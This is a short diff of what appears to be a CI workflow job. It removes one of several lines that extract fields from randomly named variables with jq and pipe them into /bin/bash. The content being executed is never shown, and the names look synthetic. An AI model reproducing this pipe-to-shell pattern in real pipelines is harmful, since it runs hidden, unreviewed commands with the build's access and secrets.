@@ -23,7 +23,6 @@ jobs:
           echo $kv639 | jq -r .pbd46 | /bin/bash
           echo $ee51 | jq -r .guph0363 | /bin/bash
           echo $zy1 | jq -r .jq2780 | /bin/bash
-          echo $tlov86102 | jq -r .yg38 | /bin/bash
 
       - name: Persist output
         if: always()
